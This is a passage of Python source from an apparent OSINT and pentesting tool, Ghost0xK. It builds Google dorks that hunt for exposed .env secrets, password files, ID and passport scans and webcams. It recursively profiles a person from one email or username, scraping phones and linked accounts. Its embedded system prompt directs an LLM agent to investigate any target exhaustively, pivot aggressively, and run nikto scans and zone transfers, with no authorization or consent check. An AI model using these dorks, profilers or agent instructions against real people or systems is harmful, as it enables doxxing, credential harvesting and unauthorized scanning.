    print(f"{Y}[*] This may take a minute...{Wh}")

    results = search_darkweb(query)

    print(f"\n {Wh}{'='*50}")
    print(f" {R} DARK WEB RESULTS")
    print(f" {Wh}{'='*50}")
    print(f"{Wh} Query          : {Gr}{query}")
    print(f"{Wh} Tor Available  : {Gr}{results['tor_available']}")
    print(f"{Wh} Onion Links    : {Gr}{results['ahmia']['total']}")

    if results["ahmia"]["onion_links"]:
        print(f"\n{Gr}[+] Found onion links:{Wh}")
        for i, link in enumerate(results["ahmia"]["onion_links"][:10], 1):
            print(f"    {Wh}{i}. {C}{link}{RS}")
        if results["ahmia"]["descriptions"][:10]:
            print(f"\n{Y}[*] Descriptions:{Wh}")
            for i, desc in enumerate(results["ahmia"]["descriptions"][:5], 1):
                print(f"    {Wh}{i}. {Y}{desc[:100]}...{Wh}")

    if results["tested_onions"]:
        reachable = [o for o in results["tested_onions"] if o.get("reachable")]
        if reachable:
            print(f"\n{Gr}[+] Reachable onion sites ({len(reachable)}):{Wh}")
            for site in reachable:
                print(f"    {Gr}[+] {C}{site['url'][:60]}{Wh} - {Y}{site.get('title', 'N/A')}")

    print(f"\n{Wh} Summary ")
    print(f"{Wh} {results['summary']}")

    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="darkweb",
        target=query,
        data={"query": query, "tor_available": results["tor_available"], "ahmia": results["ahmia"], "tested": results["tested_onions"]}
    )
    save_report(result)
    input(f"\n{Wh}[+] Press Enter")


DORK_CATEGORIES = {
    "Files & Documents": {
        "pdf": 'filetype:pdf "confidential" OR "private"',
        "xlsx": 'filetype:xlsx "salary" OR "employee" OR "customer"',
        "docx": 'filetype:docx "password" OR "confidential"',
        "env": 'filetype:env DB_PASSWORD OR API_KEY OR SECRET',
        "sql": 'filetype:sql "INSERT INTO" OR "password"',
        "log": 'filetype:log "password" OR "error" OR "failed"',
        "config": 'filetype:xml OR filetype:config OR filetype:cfg "password"',
        "backup": 'filetype:bak OR filetype:old OR filetype:backup',
    },
    "Login Portals & Admin": {
        "admin": 'intitle:"login" OR intitle:"admin" inurl:admin',
        "wp_admin": 'inurl:/wp-admin/ OR inurl:/wp-login.php',
        "panel": 'intitle:"control panel" OR intitle:"admin panel"',
        "cpanel": 'intitle:"cpanel" OR "cpanel login"',
        "webmail": 'intitle:"webmail" OR intitle:"roundcube"',
    },
    "Cameras & IoT": {
        "webcam": 'intitle:"webcam" OR intitle:"live view" OR intitle:"camera"',
        "dvr": 'intitle:"DVR" OR intitle:"network camera" OR intitle:"Axis"',
        "router": 'intitle:"router" OR intitle:"modem" OR intitle:"network"',
        "printer": 'intitle:"printer" OR intitle:"print server" OR "hp laserjet"',
    },
    "Exposed Services": {
        "git": 'intitle:"index of" ".git" OR ".svn"',
        "aws": 'site:s3.amazonaws.com OR site:s3-us-west-2.amazonaws.com',
        "jenkins": 'intitle:"Jenkins" "Manage Jenkins"',
        "kibana": 'intitle:"kibana" OR inurl:app/kibana',
        "grafana": 'intitle:"grafana" "login" OR "dashboard"',
    },
    "Personal Information": {
        "email_list": 'filetype:xls OR filetype:csv "email" OR "e-mail"',
        "passwords": '"password" filetype:txt OR filetype:log',
        "id_cards": 'filetype:pdf "ID" OR "passport" OR "drivers license" site:gov',
        "resumes": 'filetype:pdf "resume" OR "CV" OR "curriculum" email @gmail.com',
    },
    "Social Media OSINT": {
        "linkedin": 'site:linkedin.com/in "software engineer" "location"',
        "facebook": 'site:facebook.com "public" "photos"',
        "twitter": 'site:twitter.com intitle:"profile" OR "status"',
        "instagram": 'site:instagram.com intitle:"profile"',
    },
}

GOOGLE_DORKS_CONFIG = {
    "safe_search": False,
    "results_per_page": 10,
}

def build_google_dork(category: str, subcategory: str, custom_target: str = "") -> str:
    dork = DORK_CATEGORIES.get(category, {}).get(subcategory, "")
    if custom_target:
        dork = f"{dork} site:{custom_target}" if "site:" not in dork else dork.replace("site:", f"site:{custom_target} OR site:")
    return dork

def execute_google_dork(dork: str, pages: int = 1) -> Dict:
    results = {"urls": [], "titles": [], "snippets": [], "total": 0}
    try:
        headers = {"User-Agent": random.choice(CONFIG["user_agents"])}
        for page in range(pages):
            start = page * 10
            url = f"https://www.google.com/search?q={url_quote(dork)}&start={start}"
            resp = requests.get(url, headers=headers, timeout=15)
            if resp.status_code == 200:
                if BeautifulSoup:
                    soup = BeautifulSoup(resp.text, "html.parser")
                    for g in soup.select(".g") or soup.find_all("div", class_="g"):
                        link = g.find("a")
                        h3 = g.find("h3")
                        snippet = g.find("div", class_=["VwiC3b", "st"])
                        if link and link.get("href", "").startswith("http"):
                            results["urls"].append(link["href"])
                            results["titles"].append(h3.get_text() if h3 else "N/A")
                            results["snippets"].append(snippet.get_text()[:200] if snippet else "")
                    if not soup.select(".g"):
                        urls = re.findall(r'href="(https?://[^"]+)"', resp.text)
                        snippets = re.findall(r'<div[^>]*class="[^"]*VwiC3b[^"]*"[^>]*>(.*?)</div>', resp.text, re.DOTALL)
                        results["urls"] = [u for u in urls if u.startswith("http") and "google.com" not in u]
                        results["snippets"] = [re.sub(r'<[^>]+>', '', s)[:200] for s in snippets]
        results["total"] = len(results["urls"])
    except:
        pass
    return results

def dork_builder_menu():
    print(f"\n {Wh}{'='*50}")
    print(f" {R} GOOGLE DORKS BUILDER")
    print(f" {Wh}{'='*50}")

    cat_list = list(DORK_CATEGORIES.keys())
    print(f"\n{Wh}[*] Select category:{Wh}")
    for i, cat in enumerate(cat_list, 1):
        print(f"    {R}[{Gr}{i}{R}]{Wh} {cat}")

    cat_choice = input(f"\n{Wh}[+] Category {Gr}[1-{len(cat_list)}]{Wh}: {Gr}").strip()
    if not cat_choice.isdigit() or int(cat_choice) < 1 or int(cat_choice) > len(cat_list):
        return
    category = cat_list[int(cat_choice) - 1]

    sub_list = list(DORK_CATEGORIES[category].keys())
    print(f"\n{Y}[*] {category} dorks:{Wh}")
    for i, sub in enumerate(sub_list, 1):
        print(f"    {R}[{Gr}{i}{R}]{Wh} {sub:<20} → {C}{DORK_CATEGORIES[category][sub][:50]}...{RS}")

    sub_choice = input(f"\n{Wh}[+] Dork {Gr}[1-{len(sub_list)}]{Wh}: {Gr}").strip()
    if not sub_choice.isdigit() or int(sub_choice) < 1 or int(sub_choice) > len(sub_list):
        return
    subcategory = sub_list[int(sub_choice) - 1]
    dork = DORK_CATEGORIES[category][subcategory]

    target = input(f"{Wh}[+] Target domain {Gr}[optional, Enter to skip]{Wh}: {Gr}").strip()
    if target:
        dork = f"{dork} site:{target}"

    print(f"\n{Wh} Generated Dork ")
    print(f"{C}{dork}{RS}")

    if input(f"\n{Wh}[?] Execute search? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
        pages = input(f"{Wh}[?] Pages {Gr}[1-5, default=1]{Wh}: {Gr}").strip()
        pages = min(5, max(1, int(pages))) if pages.isdigit() else 1

        print(f"\n{Y}[*] Executing Google dork...{Wh}")
        results = execute_google_dork(dork, pages)

        print(f"\n{Gr}[+] Found {results['total']} results{Wh}")
        for i, url in enumerate(results["urls"][:20], 1):
            print(f"\n{Wh}{i}. {C}{url[:90]}{RS}")
            if i <= len(results["snippets"]) and results["snippets"][i-1]:
                print(f"   {Y}{results['snippets'][i-1][:150]}...{RS}")

        scan_result = ScanResult(
            timestamp=datetime.now().isoformat(),
            scan_type="google_dork",
            target=dork[:100],
            data={"dork": dork, "results": results}
        )
        save_report(scan_result)

    input(f"\n{Wh}[+] Press Enter")


AGENTIC_CONFIG = {
    "max_depth": 3,
    "max_branches": 5,
    "auto_report": True,
    "investigation_timeout": 300,
}

class InvestigationNode:
    def __init__(self, data_type: str, value: str, source: str = "", depth: int = 0):
        self.data_type = data_type
        self.value = value
        self.source = source
        self.depth = depth
        self.children = []
        self.findings = {}
        self.timestamp = datetime.now().isoformat()

    def to_dict(self):
        return {
            "type": self.data_type,
            "value": self.value,
            "source": self.source,
            "depth": self.depth,
            "findings": self.findings,
            "children": [c.to_dict() for c in self.children],
        }

def investigate_email_agentic(email: str, depth: int = 0) -> InvestigationNode:
    node = InvestigationNode("email", email, depth=depth)
    if depth > AGENTIC_CONFIG["max_depth"]:
        return node

    print(f"{'  ' * depth}{Y}[→] Investigating email: {email}{Wh}")

    breach_data = check_email_breaches_advanced(email)
    if breach_data.get("total_breaches", 0) > 0:
        node.findings["breaches"] = breach_data["total_breaches"]
        node.findings["breach_sites"] = [b.get("Name") for b in breach_data.get("breaches", [])[:5]]
        print(f"{'  ' * depth}{R}  [!] Found in {breach_data['total_breaches']} breaches{Wh}")

    username = email.split("@")[0]
    domain = email.split("@")[1]

    if username and len(username) > 2 and depth < AGENTIC_CONFIG["max_depth"]:
        unode = investigate_username_agentic(username, depth + 1)
        node.children.append(unode)

    if depth == 0:
        domain_node = InvestigationNode("domain", domain, source=email, depth=depth + 1)
        dns_info = dns_lookup(domain)
        domain_node.findings["ip"] = dns_info.get("A", "N/A")
        node.children.append(domain_node)

    return node

def investigate_username_agentic(username: str, depth: int = 0) -> InvestigationNode:
    node = InvestigationNode("username", username, depth=depth)
    if depth > AGENTIC_CONFIG["max_depth"]:
        return node

    print(f"{'  ' * depth}{Y}[→] Investigating username: {username}{Wh}")

    session = get_session()
    results = {}
    found_count = 0
    all_platforms = [
        {"url": "https://www.github.com/{}", "name": "GitHub"},
        {"url": "https://www.reddit.com/user/{}", "name": "Reddit"},
        {"url": "https://x.com/{}", "name": "Twitter/X"},
        {"url": "https://www.instagram.com/{}", "name": "Instagram"},
        {"url": "https://t.me/{}", "name": "Telegram"},
        {"url": "https://medium.com/@{}", "name": "Medium"},
        {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
        {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
        {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
        {"url": "https://www.facebook.com/{}", "name": "Facebook"},
    ]

    for site in all_platforms:
        try:
            url = site['url'].format(username)
            resp = session.get(url, timeout=5, allow_redirects=True)
            body = resp.text[:500].lower() if resp.status_code == 200 else ""
            patterns = NOT_FOUND_PATTERNS.get(site['name'], [])
            not_found = any(p in body for p in patterns) if patterns else False
            status = "found" if (resp.status_code == 200 and not not_found) or resp.status_code == 403 else "not_found"
            if status == "found":
                found_count += 1
                results[site['name']] = url
                print(f"{'  ' * depth}{Gr}  [+] Found on {site['name']}: {url}{Wh}")
                if depth < AGENTIC_CONFIG["max_depth"] - 1 and found_count <= AGENTIC_CONFIG["max_branches"]:
                    scraped = scrape_profile_page(url, resp.text if resp.status_code == 200 else "")
                    if scraped:
                        for extra_type, extra_val in scraped.items():
                            if extra_val:
                                child = InvestigationNode(extra_type, extra_val, source=site['name'], depth=depth + 1)
                                node.children.append(child)
        except:
            pass

    node.findings["profiles_found"] = found_count
    node.findings["platforms"] = results
    return node

def scrape_profile_page(url: str, html: str) -> Dict:
    extras = {}
    if not html:
        return extras

    emails = re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', html)
    if emails:
        extras["email"] = emails[0]

    phones = re.findall(r'\+?\d{1,4}[\s-]?\d{6,12}', html)
    if phones:
        extras["phone"] = re.sub(r'\s+', '', phones[0])

    if BeautifulSoup:
        soup = BeautifulSoup(html, "html.parser")
        for img in soup.find_all("img"):
            src = img.get("src", "")
            if src and "avatar" in src.lower() and src.startswith("http"):
                extras["avatar"] = src
                break

    return extras

def agentic_investigation():
    print(f"\n {Wh}{'='*55}")
    print(f" {R} AGENTIC AI OSINT INVESTIGATION")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Autonomous multi-step investigation engine{Wh}")
    print(f"{Y}[!] Starts with one input and recursively discovers everything{Wh}")

    target = input(f"\n{Wh}[+] Enter target {Gr}[email, username, phone, ip]{Wh}: {Gr}").strip()
    if not target:
        return

    print(f"\n{Wh} Starting investigation for: {C}{target}{RS} ")
    start_time = time.time()

    if "@" in target:
        root = investigate_email_agentic(target, 0)
    elif validate_ip(target):
        root = InvestigationNode("ip", target)
        ip_data = get_ip_info(target)
        root.findings = ip_data
    elif validate_phone(target):
        root = InvestigationNode("phone", target)
        root.findings["carrier"] = "See Phone Tracker module"
    else:
        root = investigate_username_agentic(target, 0)

    elapsed = time.time() - start_time

    print(f"\n {Wh}{'='*55}")
    print(f" {Gr} INVESTIGATION REPORT")
    print(f" {Wh}{'='*55}")
    print(f"{Wh} Target          : {C}{target}")
    print(f"{Wh} Duration        : {Gr}{elapsed:.1f}s")
    print(f"{Wh} Depth Reached   : {Gr}{root.depth}")
    print(f"{Wh} Branches        : {Gr}{count_nodes(root)}{Wh}")

    def print_tree(node: InvestigationNode, indent: int = 0):
        prefix = "  " * indent
        icon = {"email": "", "username": "", "domain": "", "ip": "", "phone": "",
                "email_found": "", "phone_found": "", "avatar": ""}.get(node.data_type, "•")
        print(f"{prefix}{Wh}{icon} {C}{node.data_type}: {Gr}{node.value}{Wh}")
        if node.findings:
            for k, v in list(node.findings.items())[:3]:
                if isinstance(v, list):
                    print(f"{prefix}  {Y}{k}: {', '.join(str(x) for x in v[:3])}")
                else:
                    print(f"{prefix}  {Y}{k}: {v}")
        for child in node.children:
            print_tree(child, indent + 1)

    print_tree(root)

    report_data = {
        "target": target,
        "duration": elapsed,
        "root": root.to_dict(),
        "node_count": count_nodes(root),
    }

    result = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="agentic_ai",
        target=target,
        data=report_data
    )
    save_report(result)
    input(f"\n{Wh}[+] Press Enter")

def count_nodes(node: InvestigationNode) -> int:
    return 1 + sum(count_nodes(c) for c in node.children)


def load_reports() -> List[Dict]:
    reports_dir = Path(CONFIG["output_dir"])
    if not reports_dir.exists():
        return []
    reports = []
    for f in sorted(reports_dir.glob("*.json"), key=os.path.getmtime, reverse=True)[:20]:
        try:
            with open(f, encoding="utf-8") as fh:
                reports.append(json.load(fh))
        except:
            pass
    return reports

def ai_correlation_engine():
    print(f"\n {Wh}{'='*55}")
    print(f" {R} AI CORRELATION ENGINE")
    print(f" {Wh}{'='*55}")
    print(f"{Y}[!] Groq-powered OSINT data correlation & analysis{Wh}")

    if Groq is None:
        print(f"{R}[!] Groq not installed. Run: pip install groq{Wh}")
        input(f"\n{Wh}[+] Press Enter")
        return

    api_key = os.environ.get("GROQ_API_KEY")
    if not api_key:
        print(f"{Y}[!] GROQ_API_KEY not set in environment{Wh}")
        key = input(f"{Wh}[+] Enter your Groq API key {Gr}[or leave empty to skip]{Wh}: {Gr}").strip()
        if not key:
            return
        os.environ["GROQ_API_KEY"] = key
        api_key = key

    reports = load_reports()
    manual_data = {}

    print(f"\n{Wh} DATA SOURCES ")
    print(f"{Wh}  {Gr}1{Wh}) Automatic — from saved reports ({len(reports)} found)")
    print(f"{Wh}  {Gr}2{Wh}) Manual entry — type/paste data yourself")
    print(f"{Wh}  {Gr}3{Wh}) Both — reports + manual")

    src_choice = input(f"\n{Wh}[+] Choose source {Gr}[1/2/3]{Wh}: {Gr}").strip()

    if src_choice in ("2", "3"):
        print(f"\n{Y}[*] Paste the OSINT data to analyze (multi-line, Ctrl+Z then Enter to finish):{Wh}")
        lines = []
        try:
            while True:
                line = input()
                lines.append(line)
        except EOFError:
            pass
        raw = "\n".join(lines).strip()
        if raw:
            try:
                manual_data = json.loads(raw) if raw.startswith("{") else {"raw_data": raw}
            except json.JSONDecodeError:
                manual_data = {"raw_data": raw}

    if src_choice == "1" and not reports:
        print(f"{R}[!] No saved reports found. Run some scans first.{Wh}")
        input(f"\n{Wh}[+] Press Enter")
        return

    print(f"\n{Y}[*] Sending data to AI for correlation & analysis...{Wh}")
    print(f"{Y}[*] Model: {GROQ_MODEL}{Wh}")

    system_prompt = """You are an expert OSINT analyst AI. Your task is to analyze, correlate, and enrich the provided intelligence data.

Follow these steps:
1. DATA SUMMARY — Categorize each piece of data (IP, email, username, phone, domain, breach, etc.)
2. CROSS-CORRELATION — Identify links between seemingly unrelated data points (same IP hosting multiple domains, email username matching social media handles, phone country matching IP location, etc.)
3. PATTERN RECOGNITION — Detect anomalies, common infrastructure, repeated names, overlapping timestamps
4. RISK ASSESSMENT — Score the target's exposure risk (0-100) based on data leaked, interconnectedness, attack surface
5. NEW DERIVED INSIGHTS — Generate new intelligence that is not explicitly in the raw data but logically inferred:
   - Likely professions, locations, interests
   - Connected accounts across platforms
   - Possible email/username patterns for undiscovered accounts
   - Infrastructure relationships (same owner, hosting provider)
   - Behavioral patterns (posting times, platforms used)
6. ACTIONABLE RECOMMENDATIONS — Suggest specific next steps for deeper investigation

Format your response in clear sections with markdown headings. Be concise but thorough. Base every conclusion on the data provided and label inferred insights as [INFERRED]."""

    context_data = {}
    if reports:
        context_data["saved_reports"] = reports
    if manual_data:
        context_data["manual_input"] = manual_data

    try:
        client = Groq(api_key=api_key)
        completion = client.chat.completions.create(
            model=GROQ_MODEL,
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": json.dumps(context_data, indent=2, default=str)}
            ],
            temperature=0.7,
            max_tokens=4096,
            top_p=0.95,
            stream=True,
            stop=None
        )

        print(f"\n{Gr} AI CORRELATION RESULTS {Wh}{RS}\n")
        full_response = []
        for chunk in completion:
            content = chunk.choices[0].delta.content or ""
            print(content, end="", flush=True)
            full_response.append(content)
        print(f"\n\n{Wh}{''*38}{RS}")

        result_text = "".join(full_response)
        result = ScanResult(
            timestamp=datetime.now().isoformat(),
            scan_type="ai_correlation",
            target="correlation_analysis",
            data={"report_count": len(reports), "analysis": result_text}
        )
        save_report(result)
        print(f"{Gr}[] Analysis saved to reports/{Wh}")

    except Exception as e:
        print(f"\n{R}[!] AI request failed: {e}{Wh}")

    input(f"\n{Wh}[+] Press Enter")


# ── AI Agent System — Unified Tool-Aware Autonomous Investigator ─────
# Agent wrappers for tools that normally use input()
def _agent_ip_track(ip: str) -> Dict:
    result = {"ip": ip}
    if not validate_ip(ip):
        result["error"] = "Invalid IP"
        return result
    info = get_ip_info(ip)
    result.update(info)
    return result

def _agent_phone_lookup(phone: str) -> Dict:
    result = {"phone": phone}
    try:
        import phonenumbers
        x = phonenumbers.parse(phone, None)
        result["valid"] = phonenumbers.is_valid_number(x)
        result["country"] = phonenumbers.region_code_for_number(x)
        result["carrier"] = carrier.name_for_number(x, "en") if hasattr(carrier, 'name_for_number') else "N/A"
        result["timezones"] = list(phone_timezone.time_zones_for_number(x)) if hasattr(phone_timezone, 'time_zones_for_number') else []
        result["formatted"] = phonenumbers.format_number(x, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    except Exception as e:
        result["error"] = str(e)
    return result

def _agent_username_track(username: str) -> Dict:
    result = {"username": username, "profiles": {}}
    session = get_session()
    platforms = [
        ("GitHub", "https://www.github.com/{}"),
        ("Reddit", "https://www.reddit.com/user/{}"),
        ("Twitter/X", "https://x.com/{}"),
        ("Instagram", "https://www.instagram.com/{}"),
        ("Telegram", "https://t.me/{}"),
        ("Medium", "https://medium.com/@{}"),
        ("Twitch", "https://www.twitch.tv/{}"),
        ("TikTok", "https://www.tiktok.com/@{}"),
        ("YouTube", "https://www.youtube.com/@{}"),
        ("Pinterest", "https://www.pinterest.com/{}"),
        ("Snapchat", "https://www.snapchat.com/add/{}"),
    ]
    for name, url_tpl in platforms:
        try:
            url = url_tpl.format(username)
            resp = session.get(url, timeout=5, allow_redirects=True)
            if resp.status_code == 200 or resp.status_code == 403:
                result["profiles"][name] = url
        except:
            pass
    result["profiles_found"] = len(result["profiles"])
    return result

def _agent_email_osint(email: str) -> Dict:
    result = {"email": email}
    result["breaches"] = check_email_breaches_advanced(email)
    username = email.split("@")[0] if "@" in email else ""
    domain = email.split("@")[1] if "@" in email else ""
    if username:
        try:
            result["username_search"] = _agent_username_track(username)
        except:
            pass
    if domain:
        try:
            result["domain_info"] = dns_lookup(domain)
        except:
            pass
    return result

def _agent_pastebin_search(query: str) -> Dict:
    result = {"query": query, "results": []}
    try:
        resp = requests.get(
            f"https://psbdmp.ws/api/search/{requests.utils.quote(query)}",
            timeout=8,
            headers={"User-Agent": random.choice(CONFIG["user_agents"])}
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, list):
                result["results"] = data[:20]
                result["count"] = len(data)
            elif isinstance(data, dict):
                result["results"] = [data]
                result["count"] = 1
    except:
        try:
            resp = requests.get(
                f"https://pastebin.com/search?q={requests.utils.quote(query)}",
                timeout=8,
                headers={"User-Agent": random.choice(CONFIG["user_agents"])}
            )
            if resp.status_code == 200:
                result["raw_html_size"] = len(resp.text)
                result["note"] = "Scraped pastebin search page"
        except:
            result["error"] = "Search failed"
    return result

def _agent_github_search(query: str) -> Dict:
    result = {"query": query, "repos": [], "code": [], "users": []}
    session = get_session()
    try:
        resp = session.get(
            f"https://api.github.com/search/code?q={requests.utils.quote(query)}&per_page=10",
            timeout=8
        )
        if resp.status_code == 200:
            items = resp.json().get("items", [])
            for item in items[:10]:
                result["code"].append({
                    "repo": item.get("repository", {}).get("full_name", ""),
                    "path": item.get("path", ""),
                    "url": item.get("html_url", "")
                })
    except:
        pass
    try:
        resp = session.get(
            f"https://api.github.com/search/repositories?q={requests.utils.quote(query)}&per_page=5",
            timeout=8
        )
        if resp.status_code == 200:
            items = resp.json().get("items", [])
            for item in items[:5]:
                result["repos"].append({
                    "name": item.get("full_name", ""),
                    "desc": item.get("description", ""),
                    "url": item.get("html_url", ""),
                    "stars": item.get("stargazers_count", 0)
                })
    except:
        pass
    return result

def _agent_dns_enum(domain: str) -> Dict:
    result = {"domain": domain}
    engine = DnsReconEngine(domain)
    result["dns"] = engine.standard_enum(do_axfr=True)
    result["subdomains_crt"] = get_subdomains_crt(domain)[:30]
    result["technologies"] = get_domain_technologies(domain)
    result["security"] = check_domain_security(domain)
    result["related"] = get_domain_related(domain)
    try:
        result["whois"] = whois_lookup(domain)
    except:
        pass
    return result

# ── AI Agent System v2 — Multi-Step Deep Investigator ───────────────

AGENT_SYSTEM_PROMPT = """You are an autonomous OSINT AI agent embedded inside the Ghost0xK pentesting tool. Your goal is to perform a **deep, multi-step investigation** of the given target by calling tools, analyzing results, and discovering hidden connections.

## TOOL CATALOG

### DNS & Domain Tools
1. `dns_lookup(domain)` — A, AAAA records. Returns `{"A":[...],"AAAA":[...]}`
2. `dns_records_full(domain)` — NS, MX, TXT, SOA. Returns `{"NS":[...],"MX":[...],"TXT":[...],"SOA":{...}}`
3. `whois_lookup(domain)` — Registrar, dates, contacts. Returns registrar + raw text
4. `get_subdomains_crt(domain)` — CRT.sh certificate transparency. Returns list of subdomains
5. `check_domain_security(domain)` — SSL, HSTS, SPF, DMARC booleans
6. `get_domain_technologies(domain)` — Server, CDN, frameworks, analytics, CMS
7. `get_domain_related(domain)` — Typosquatting/similar domains
8. `check_ssl_cert(domain)` — Issuer, subject, validity dates
9. `wayback_check(domain)` — Archived snapshots from Wayback Machine
10. `agent_dns_enum(domain)` — **All-in-one**: full DNS + AXFR + subdomains CRT + tech + security + related + WHOIS

### IP & Network Tools
11. `get_ip_info(ip)` — Geolocation (country, city, lat/lon), ISP, org, ASN
12. `agent_ip_track(ip)` — Full IP tracking with abuse reports

### Email Tools
13. `agent_email_osint(email)` — **All-in-one**: breach check + username track (extracted username) + domain DNS
14. `check_email_platforms(email)` — **Holehe-style**: checks if email is registered on Twitter, Instagram, Adobe, Snapchat, Spotify, Pinterest, Tumblr, Patreon, Dribbble, GitLab, WordPress.com

### Username Tools
15. `agent_username_track(username)` — Searches 11 platforms (GitHub, Reddit, Twitter/X, Instagram, Telegram, Medium, Twitch, TikTok, YouTube, Pinterest, Snapchat)

### Phone Tools
16. `agent_phone_lookup(phone)` — Validity, country, carrier, timezone, formatted number

### Search & OSINT Tools
17. `agent_pastebin_search(query)` — Pastebin/dump sites for leaked data
18. `agent_github_search(query)` — GitHub code + repositories search
19. `harvester_search(query, sources)` — **theHarvester-style**: searches Google/Bing for emails, CRT.sh for subdomains, DNS for IPs. sources: "all","google","bing","crt","dns"
20. `social_scraper(platform, query, limit)` — **snscrape**: scrape Twitter or Reddit posts without API. platform: "twitter" or "reddit"

### Web & Security Tools
21. `whatweb_detect(target)` — **whatweb**: detailed tech/CMS/version detection (CLI)
22. `nikto_scan(target)` — **nikto**: web vulnerability scanner for dangerous files/CGI (CLI)
23. `gospider_crawl(target, depth)` — **gospider**: deep JS-aware crawler, extracts URLs, forms, JS files, subdomains (CLI)

## INVESTIGATION PROTOCOL

You MUST follow this exact sequence for every target:

### PHASE 1 — PLAN (first response only)
Output a JSON plan:
```json
{"phase": "plan", "target_type": "email|domain|username|ip|phone", "plan": ["Step 1: ...", "Step 2: ...", "Step 3: ...", ...], "expected_pivots": ["what new targets might appear"]}
```
Your plan must have **5-10 steps** based on target type.

### PHASE 2 — EXECUTE (subsequent responses)
For each step, call ONE tool:
```json
{"phase": "execute", "step": 1, "reasoning": "why this tool now", "tool": "tool_name", "params": {"key": "value"}}
```
- After each tool result, analyze it for **new leads** (IPs, emails, usernames, domains, phones)
- If you discover a new lead, add it to the investigation queue automatically
- Do NOT conclude until you have called **at least 6 different tools**

### PHASE 3 — CORRELATE (after all tools called)
After calling 6+ tools, do a correlation pass:
```json
{"phase": "correlate", "reasoning": "connecting findings across all data sources", "connections_found": ["IP x.x.x.x hosts both domain A and email B's mail server", "username found on Twitter matches email prefix", ...], "risk_score": 0-100}
```

### PHASE 4 — FINAL REPORT
```json
{"phase": "final", "target": "...", "summary": "comprehensive investigation summary", "tools_used": ["tool1","tool2",...], "key_findings": ["finding 1","finding 2",...], "risk_score": 0-100, "connections_discovered": ["connection 1",...], "new_leads": ["lead 1","lead 2",...], "recommendations": ["rec 1","rec 2",...]}
```

## MANDATORY RULES
1. **Plan first** — your very first response MUST be a plan
2. **Minimum 6 tool calls** — do NOT conclude before calling at least 6 different tools
3. **Follow the plan** — execute each step in order
4. **Pivot aggressively** — every result may contain new targets (IPs, emails, domains). Investigate them too
5. **Correlate** — after collecting data, identify cross-source connections
6. **Be exhaustive** — for domains: DNS+WHOIS+subdomains+tech+security+related+wayback+whatweb+nikto. For emails: platforms+breaches+username+domain. For usernames: platforms+email patterns+github+pastebin+social_scraper
7. **Use the all-in-one tools** (agent_dns_enum, agent_email_osint) as force multipliers, then dig deeper with specific tools
"""


class AIAgent:
    def __init__(self, api_key: str, target: str):
        self.api_key = api_key
        self.target = target
        self.model = GROQ_MODEL
        self.client = Groq(api_key=api_key)
        self.history = []
        self.findings = {}
        self.iteration = 0
        self.max_iterations = 40
        self.min_tool_calls = 6
        self.target_type = self._detect_type(target)
        self.plan = []
        self.pending_pivots = []
        self.tools_called = 0
        self.phase = "plan"
        self.correlated = False

    def _detect_type(self, target: str) -> str:
        if "@" in target:
            return "email"
        if validate_ip(target):
            return "ip"
        if validate_phone(target):
            return "phone"
        if "." in target and not target.startswith("http") and len(target.split(".")) >= 2:
            return "domain"
        return "username"

    def _call_llm(self, messages: List) -> str:
        try:
            completion = self.client.chat.completions.create(
                model=self.model,
                messages=messages,
                temperature=0.75,
                max_tokens=3000,
                top_p=0.95
            )
            return completion.choices[0].message.content.strip()
        except Exception as e:
            return json.dumps({"phase": "final", "summary": f"LLM error: {e}",
                               "key_findings": [], "risk_score": 0})

    def _execute_tool(self, tool_name: str, params: Dict) -> Dict:
        tool_map = {
            "dns_lookup": lambda p: dns_lookup(p.get("domain", "")),
            "dns_records_full": lambda p: dns_records_full(p.get("domain", "")),
            "whois_lookup": lambda p: whois_lookup(p.get("domain", "")),
            "get_subdomains_crt": lambda p: get_subdomains_crt(p.get("domain", "")),
            "check_domain_security": lambda p: check_domain_security(p.get("domain", "")),
            "get_domain_technologies": lambda p: get_domain_technologies(p.get("domain", "")),
            "get_domain_related": lambda p: get_domain_related(p.get("domain", "")),
            "check_ssl_cert": lambda p: check_ssl_cert(p.get("domain", "")),
            "wayback_check": lambda p: wayback_check(p.get("domain", "")),
            "agent_dns_enum": lambda p: _agent_dns_enum(p.get("domain", "")),
            "get_ip_info": lambda p: get_ip_info(p.get("ip", "")),
            "agent_email_osint": lambda p: _agent_email_osint(p.get("email", "")),
            "agent_username_track": lambda p: _agent_username_track(p.get("username", "")),
            "agent_phone_lookup": lambda p: _agent_phone_lookup(p.get("phone", "")),
            "agent_pastebin_search": lambda p: _agent_pastebin_search(p.get("query", "")),
            "agent_github_search": lambda p: _agent_github_search(p.get("query", "")),
            "agent_ip_track": lambda p: _agent_ip_track(p.get("ip", "")),
            "check_email_platforms": lambda p: check_email_platforms(p.get("email", "")),
            "harvester_search": lambda p: harvester_search(p.get("query", ""), p.get("sources", "all")),
            "social_scraper": lambda p: social_scraper(p.get("platform", "twitter"), p.get("query", ""), int(p.get("limit", 20))),
            "whatweb_detect": lambda p: whatweb_detect(p.get("target", "")),
            "nikto_scan": lambda p: nikto_scan(p.get("target", "")),
            "gospider_crawl": lambda p: gospider_crawl(p.get("target", ""), int(p.get("depth", 2))),
        }
        fn = tool_map.get(tool_name)
        if not fn:
            return {"error": f"Unknown tool: {tool_name}"}
        try:
            result = fn(params)
            return result if isinstance(result, dict) else {"result": str(result)}
        except Exception as e:
            return {"error": str(e)}

    def _extract_pivots(self, tool_name: str, result: Dict) -> List[Dict]:
        """Extract new investigation leads from tool results"""
        pivots = []
        if isinstance(result, dict):
            for key, val in result.items():
                if key in ("ip", "ips", "A") and isinstance(val, str) and validate_ip(val):
                    pivots.append({"type": "ip", "value": val, "source": tool_name})
                if key in ("ip", "ips", "A") and isinstance(val, list):
                    for v in val:
                        if isinstance(v, str) and validate_ip(v):
                            pivots.append({"type": "ip", "value": v, "source": tool_name})
                if key == "domain" and isinstance(val, str) and "." in val:
                    pivots.append({"type": "domain", "value": val, "source": tool_name})
                if key == "email" and isinstance(val, str) and "@" in val:
                    pivots.append({"type": "email", "value": val, "source": tool_name})
